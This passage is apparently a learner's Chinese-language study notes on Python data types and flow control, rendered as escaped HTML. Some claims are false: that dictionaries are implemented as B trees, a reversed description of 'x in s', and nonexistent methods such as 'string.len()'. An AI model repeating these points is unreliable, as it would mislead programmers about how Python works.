&lt;li&gt;Characteristics  &lt;ul&gt;
&lt;li&gt;Mutable / Immutable (是否可變動)  &lt;ul&gt;
&lt;li&gt;Immutable 不可變動  &lt;ul&gt;
&lt;li&gt;ex: Hashable &lt;code&gt;(__hash__)&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;python 的變數可視為純 pointer  &lt;/li&gt;
&lt;li&gt;Immutable 代表該變數指向的物件是不可變動的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Ordered / Unordered  &lt;ul&gt;
&lt;li&gt;Iterable &lt;code&gt;(__iter__)&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Numeric (Immutable, Hashable)  &lt;ul&gt;
&lt;li&gt;integer  &lt;/li&gt;
&lt;li&gt;float  &lt;/li&gt;
&lt;li&gt;long  &lt;/li&gt;
&lt;li&gt;complex&lt;br /&gt;
          * &lt;code&gt;1+1j&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;小寫 j 或大寫 J 都可以  &lt;/li&gt;
&lt;li&gt;boolean&lt;br /&gt;
          * &lt;code&gt;True&lt;/code&gt;, &lt;code&gt;False&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;開頭要大寫  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Sequence (Iterable, Ordered, Mutable/Immutable)  &lt;ul&gt;
&lt;li&gt;string&lt;br /&gt;
    * Mapping&lt;br /&gt;
        * dictionary&lt;br /&gt;
    * Set  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;a = 'string'&lt;br /&gt;
1. 先建立 string 這個 object&lt;br /&gt;
2. 再建立 a 這個 pointer&lt;br /&gt;
3. 再把 a 指向 string&lt;br /&gt;
4. 所以 string 是 Immutable，但可以讓 a 指向其他的 object  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;Interger, Float and Long&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;divmod(被除數, 除數)&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;回傳商數和餘數(tuple)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;5//2&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;取商的 floor  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;5**0.5&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;**0.5&lt;/code&gt; 就是取 square root  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;bin(整數)&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;可以將該整數以 binary 表示  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;float(整數)&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;可以將該整數轉成 float 表示  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Complex&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;complex(0,1) == 0+1j&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;a = 3.0 + 4.0j&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;a.real == 3.0&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;a.imag == 4.0&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;abs(a)&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;算出該複數在複數平面上跟原點的距離  &lt;/li&gt;
&lt;li&gt;等同於 &lt;code&gt;sqrt(a.real**2 + a.imag**2)&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Boolean&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;not False&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;在 python 中直接打 &lt;code&gt;not&lt;/code&gt; 就好  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;True and False&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;在 python 中直接打 &lt;code&gt;and&lt;/code&gt; 就好  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;True or False&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;在 python 中直接打 &lt;code&gt;or&lt;/code&gt; 就好  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;False&lt;/code&gt; 的值就是 &lt;code&gt;0&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;False + 1 == 1&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;True&lt;/code&gt;  的值就是 &lt;code&gt;1&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;True + 1 == 2&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;python 裏面的 float 有做過處理所以 &lt;code&gt;10 == 10.0&lt;/code&gt; 是 &lt;code&gt;True&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;x is y&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;判斷 x 和 y 是否真的指向同一個 object  &lt;/li&gt;
&lt;li&gt;比 &lt;code&gt;==&lt;/code&gt; 嚴謹，&lt;code&gt;==&lt;/code&gt; 只在乎值是否相同，而不考慮是否為同一個 object  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;String and Unicode&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;python 的單引號和雙引號是一樣的意思  &lt;/li&gt;
&lt;li&gt;String (immutable seq.)  &lt;ul&gt;
&lt;li&gt;python 中的字串是不能更改的  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;r'字串\n'&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;r 代表 raw string  &lt;/li&gt;
&lt;li&gt;在 r'' 裏面的跳脫字元不會被轉譯  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;'''字串'''&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;多行字串 (會幫你紀錄換行符)  &lt;/li&gt;
&lt;li&gt;通常python裏面的多行註解也是這樣寫  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Unicode (Immutable seq.)  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;u'字串'&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;代表裏面存的編碼是 unicode&lt;br /&gt;
    + &lt;code&gt;ur'字串'&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;代表 raw string 裏面存的編碼是 unicode&lt;br /&gt;
    + ur 的順序是固定的 不可以寫成 ru&lt;br /&gt;
    + &lt;code&gt;u'''字串'''&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;代表裏面存的編碼是 unicode&lt;br /&gt;
    + &lt;code&gt;ord(字元)&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;將字元轉成 ascii&lt;br /&gt;
    + &lt;code&gt;chr(ascii編碼)&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;將 ascii 編碼轉成字元&lt;br /&gt;
    + &lt;code&gt;unichr(unicode編碼)&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;將 unicode 編碼轉成 unicode 字串&lt;br /&gt;
    + Decoding (str -&amp;gt; unicode)&lt;br /&gt;
    + &lt;code&gt;'中文'.decode('utf-8') == unicode('中文', 'utf-8')&lt;/code&gt;&lt;br /&gt;
    + Encoding (unicode -&amp;gt; str)&lt;br /&gt;
    + &lt;code&gt;u'中文'.encode('utf-8')&lt;/code&gt;&lt;br /&gt;
    + python2 設計的時候沒有考慮到 unicode 的問題&lt;br /&gt;
    + python3 的 str 就是 unicode&lt;br /&gt;
        + 新的型態 &lt;code&gt;bytes&lt;/code&gt; (Immutable seq.)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;常用 method (詳細的 method 請參見 python 的 doc)  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;decode()&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;encode()&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;endswith()&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;find()&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;format()&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;join()&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;lower()&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;partition()&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;replace()&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;split()&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;startwith()&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;strip()&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;upper()&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;string formatting&lt;br /&gt;
    + modulo (&lt;code&gt;%&lt;/code&gt;)&lt;br /&gt;
        + &lt;code&gt;%r&lt;/code&gt;&lt;br /&gt;
            + representation&lt;br /&gt;
            + &lt;code&gt;'Hello, %s' % name&lt;/code&gt;&lt;br /&gt;
                + 用 &lt;code&gt;name&lt;/code&gt; 的內容取代 &lt;code&gt;%s&lt;/code&gt;&lt;br /&gt;
    + &lt;code&gt;str.format()&lt;/code&gt;&lt;br /&gt;
        + &lt;code&gt;'Hello, {}'.format(name)&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;List and tuple&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align="center"&gt;List (Mutable seq.)&lt;/th&gt;
&lt;th align="center"&gt;Tuple (Immutable seq.)&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align="center"&gt;[] or list()&lt;/td&gt;
&lt;td align="center"&gt;() or tuple()&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;['item']&lt;/td&gt;
&lt;td align="center"&gt;('item', ) # 只有一個的情況下要加逗點&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;元素可以放不同的型態&lt;/td&gt;
&lt;td align="center"&gt;元素可以放不同的型態&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;List 在 python 中的實作是用 array, 所以會比較慢  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Sequence&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Immutable seq. 支援的操作  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;x in s&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;查 &lt;code&gt;s&lt;/code&gt; 是不是在 &lt;code&gt;x&lt;/code&gt; 裏面, 結果會回傳 &lt;code&gt;boolean&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;x not in s&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;搜尋是用 linear search, 效能上要注意一下  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;s + t&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;s * n&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;slice&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;string.len()&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;string.index(a)&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;如果沒找到 &lt;code&gt;a&lt;/code&gt; 的話會跳出 except 的訊息  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;string.count(a)&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;計算 string 裏面 &lt;code&gt;a&lt;/code&gt; 出現幾次  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Mutable seq. 支援的操作  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;s[1] = x&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;s[i:j] = t&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;del s[i:j]&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;s[i:j:k]&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;s.append(x)&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;s.insert(i,x)&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;s.pop([i])&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;s.remove(x)&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;s.extend(x)&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;擴充 &lt;code&gt;s&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;s.append(x)&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;將 &lt;code&gt;x&lt;/code&gt; 加進去變成元素  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;in-place&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;s.sort()&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;內建的 sort 是 &lt;a href="https://en.wikipedia.org/wiki/Timsort"&gt;Timsort&lt;/a&gt;, 是個改良板的 &lt;a href="https://en.wikipedia.org/wiki/Merge_sort"&gt;merge sort&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;s.reverse()&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;把 seq. 顛倒過來  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Sequence 支援 比較 的動作  &lt;/li&gt;
&lt;li&gt;Slicing and slice  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;s[:]    # a copy of the whole array&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Mapping&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Dictionary (Mutable map)  &lt;ul&gt;
&lt;li&gt;就是 key-value pairs  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;{'A':1, 'B':2, 'C':3}&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;dict(A=1, B=2, C=3)&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;實作是用 B tree 所以不會照順序,  &lt;/li&gt;
&lt;li&gt;如果要照順序的話可以用 collections 的 ordered dictionary  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;collections.OrderedDict()&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;或是把 key 存在一個 list 裏面  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;zip()&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;ABC&amp;#39;&lt;/span&gt;  
&lt;span class="n"&gt;v&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;pairs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;zip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  

&lt;span class="c1"&gt;# pairs 會變成 [(&amp;#39;A&amp;#39;, 1), (&amp;#39;B&amp;#39;, 2), (&amp;#39;C&amp;#39;, 3)]  &lt;/span&gt;
&lt;span class="c1"&gt;# dict(pairs) 是 {&amp;#39;A&amp;#39;: 1, &amp;#39;C&amp;#39;: 3, &amp;#39;B&amp;#39;: 2}  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;dictionary 可以用 string 當 key, list 就不行  &lt;/li&gt;
&lt;li&gt;支援的操作 (k is the name of key)  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;len(d)&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;d[k]&lt;/code&gt;    &lt;/li&gt;
&lt;li&gt;&lt;code&gt;d[k] = v (Mutable)&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;del d[k]&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;k in d, k not in d&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;d.copy()&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;d.get(key[, default])&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;d.setdefault(key[, default])&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;d.items(), d.keys(), d.values()&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;在 python 3 裏面這 3 個函式回傳的都是 iter 不是 list  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;d.pop(key[, default])&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;d.update([other])&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;d.update(dict(...))&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;None&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;是個 object, 有點類似 c 裏面的 &lt;code&gt;NULL&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;可以用 python 先簡單寫出演算法並證明自己的想法, 再用 C 去實作出來  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Set (mutable set)&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="c1"&gt;# python2  &lt;/span&gt;
&lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ABC&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;B&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;C&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;  
&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;B&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;C&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="c1"&gt;# python3  &lt;/span&gt;

&lt;span class="c1"&gt;# s 代表 set  &lt;/span&gt;
&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;  
&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;elem&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;discard&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;elem&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pop&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  
&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;|=&lt;/span&gt; &lt;span class="n"&gt;other_s&lt;/span&gt;  
&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;=&lt;/span&gt; &lt;span class="n"&gt;other_s&lt;/span&gt;  
&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;other_s&lt;/span&gt;  
&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;other_s&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Flow Control&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;注意冒號和縮排    &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;if-else&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;condition 不需要用 &lt;code&gt;()&lt;/code&gt; 包起來  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;condition_1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;condition_2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;span class="o"&gt;...&lt;/span&gt;  
&lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;condition_N&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;被視為 False 的值&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;None&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;False&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;Zeros  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;0&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;0.0&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;0L&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;0j&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Empty containers  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;''&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;[]&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;{}&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__nonzero__()&lt;/code&gt; or&lt;code&gt;__len__()&lt;/code&gt; return &lt;code&gt;0&lt;/code&gt; or &lt;code&gt;False&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;注意:&lt;br /&gt;
&lt;code&gt;if [0]&lt;/code&gt;: 和 &lt;code&gt;if [[]]&lt;/code&gt;: 後的敘述會被執行&lt;br /&gt;
因為 [] 裏面有包含東西就不會被視為空的&lt;br /&gt;
() 和 {} 也是同樣的道理  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;for (for-each 的性質, python 裏面只有這種for)&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;for [item] in [iterable]:&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;for i in range(3):&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;會建個 list 出來, 比較浪費資源  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;for i in xrange(3):&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;xrange 只會建個 iter, 比較節省資源  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;python3 沒有 &lt;code&gt;xrange()&lt;/code&gt;, 因為 python3 的 &lt;code&gt;range()&lt;/code&gt; 就是 python2 的 &lt;code&gt;xrange()&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;python3 裏面把很多東西都改成比較節省資源的方式  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;item&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;enumerate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sth&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;item&lt;/span&gt;  

&lt;span class="c1"&gt;# i 會是從0開始的 index, item 就是 sth 裏面的 element  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;python 的 &lt;code&gt;for&lt;/code&gt; 可以 iterate all of iterable object  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;iter(sth)&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;可以把 sth 轉成 iter 後回傳  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;while&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;tasks&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="n"&gt;tasks&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="o"&gt;...&lt;/span&gt;  

&lt;span class="c1"&gt;# 當 tasks 變成 empty 的時候就跳出迴圈  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;break, continue (都只能用在 loop 裏面)&lt;/h3&gt;
&lt;p&gt;就跟 C 一樣,&lt;br /&gt;
可能可以讓 python 執行的更快&lt;br /&gt;
因為python是 interpretation&lt;br /&gt;
提前結束的話可以少跑一些程式&lt;br /&gt;
